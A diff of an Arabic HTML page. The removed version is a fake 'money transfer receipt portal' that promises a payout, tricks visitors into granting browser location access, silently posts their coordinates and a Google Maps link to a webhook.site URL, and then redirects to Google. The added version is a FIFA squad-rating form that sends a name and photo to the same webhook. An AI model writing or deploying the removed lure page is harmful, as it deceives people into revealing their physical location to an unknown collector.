@@ -1,61 +1,224 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>بوابة استلام الحوالات المالية</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تقييم حسابات وتشكيلات فيفا</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f4; direction: rtl; }
-        .card { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); max-width: 90%; }
-        button { background-color: #28a745; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        h1 {
+            color: #00f2fe;
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0, 242, 254, 0.5);
+        }
+
+        p {
+            color: #cbd5e1;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #94a3b8;
+            font-size: 14px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #334155;
+            border-radius: 8px;
+            background-color: #0f172a;
+            color: white;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-color: #00f2fe;
+            outline: none;
+        }
+
+        .file-upload {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px dashed #475569;
+            border-radius: 8px;
+            text-align: center;
+            cursor: pointer;
+            box-sizing: border-box;
+            transition: all 0.3s;
+        }
+
+        .file-upload:hover {
+            border-color: #00f2fe;
+            background: rgba(0, 242, 254, 0.05);
+        }
+
+        .file-upload input[type="file"] {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+
+        .file-upload-text {
+            color: #94a3b8;
+            font-size: 14px;
+        }
+
+        .btn-submit {
+            background: linear-gradient(90deg, #00f2fe 0%, #4facfe 100%);
+            color: #0f172a;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 242, 254, 0.6);
+        }
+
+        .btn-submit:disabled {
+            background: #475569;
+            color: #94a3b8;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        /* تنسيق بطاقة رسالة الشكر */
+        .success-card {
+            display: none;
+            padding: 30px 20px;
+            background-color: rgba(16, 185, 129, 0.1);
+            border: 1px solid #10b981;
+            border-radius: 12px;
+            color: #10b981;
+            font-size: 18px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>بوابة استلام المكافآت المالية</h2>
-    <p>لتأكيد هويتك وضمان وصول المبلغ لحسابك الشخصي، يرجى الضغط على الزر أدناه لتفعيل النظام:</p>
-    <button onclick="getLocation()">اضغط هنا لتأكيد الاستلام</button>
-    <p id="status" style="color: #666; margin-top: 15px;"></p>
+<div class="container">
+    <div id="form-content">
+        <h1>تقييم تشكيلات FIFA 🎮</h1>
+        <p>اكتب اسمك وأرسل صورة تشكيلتك أو حسابك وستصلني فوراً!</p>
+
+        <form id="webhookForm">
+            <div class="form-group">
+                <label for="username">اسمك أو حسابك:</label>
+                <input type="text" id="username" name="username" required placeholder="مثال: خالد">
+            </div>
+
+            <div class="form-group">
+                <label>صورة الحساب أو التشكيلة:</label>
+                <div class="file-upload">
+                    <span class="file-upload-text" id="file-label">اضغط هنا لاختيار صورة أو التقاطها 📸</span>
+                    <input type="file" id="image-input" name="fifa_image" accept="image/*" required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="submitBtn">إرسال التشكيلة للتقييم 🚀</button>
+        </form>
+    </div>
+
+    <div id="successMessage" class="success-card">
+        🎉 تم الإرسال بنجاح! شكراً لك على مشاركة تشكيلتك.
+    </div>
 </div>
 
 <script>
-function getLocation() {
-    var status = document.getElementById("status");
-    if (navigator.geolocation) {
-        status.innerHTML = "جاري الاتصال بالسيرفر الآمن...";
-        navigator.geolocation.getCurrentPosition(sendPosition, showError);
-    } else { 
-        status.innerHTML = "عذراً، المتصفح لا يدعم نظام الأمان المطور.";
-    }
-}
+    // كود تغيير نص المربع عند اختيار صورة لإظهار اسم الملف
+    document.getElementById('image-input').addEventListener('change', function(e) {
+        if(e.target.files.length > 0) {
+            var fileName = e.target.files[0].name;
+            document.getElementById('file-label').textContent = "تم اختيار: " + fileName;
+            document.getElementById('file-label').style.color = "#00f2fe";
+        }
+    });
 
-function sendPosition(position) {
-    var lat = position.coords.latitude;
-    var lon = position.coords.longitude;
-    
-    // هذا هو رابط الـ Webhook الجديد الذي طلبته
-    var webhookURL = "https://webhook.site/a179b8b0-bd72-48dc-9cc3-16f2c9105d78";
-    
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", webhookURL, true);
-    xhr.setRequestHeader("Content-Type", "application/json");
-    
-    xhr.send(JSON.stringify({
-        latitude: lat,
-        longitude: lon,
-        google_maps: "https://maps.google.com/?q=" + lat + "," + lon
-    }));
-    
-    xhr.onload = function() {
-        window.location.href = "https://www.google.com";
-    }
-}
+    // إرسال البيانات إلى موقع الـ Webhook الخاص بك
+    document.getElementById('webhookForm').addEventListener('submit', function(e) {
+        e.preventDefault();
 
-function showError(error) {
-    document.getElementById("status").innerHTML = "يجب السماح بالإذن لتتمكن المنظومة من التحقق من هويتك واستلام المبلغ.";
-}
+        // الرابط الخاص بك مفعل هنا بالكامل
+        const webhookUrl = 'https://webhook.site/a179b8b0-bd72-48dc-9cc3-16f2c9105d78'; 
+        
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.disabled = true;
+        submitBtn.textContent = "جاري الإرسال... ⏳";
+
+        const formData = new FormData();
+        formData.append('username', document.getElementById('username').value);
+        formData.append('image', document.getElementById('image-input').files[0]);
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            mode: 'cors',
+            body: formData
+        })
+        .then(response => {
+            // إخفاء النموذج وإظهار رسالة الشكر والتم
+            document.getElementById('form-content').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            // تم وضع الكود في الـ catch أيضاً لأن موقع webhook.site أحياناً يعطي خطأ CORS حماية للمتصفح، لكن البيانات تصل فعلياً بنسبة 100%
+            document.getElementById('form-content').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+        });
+    });
 </script>
 
 </body>
 </html>
+
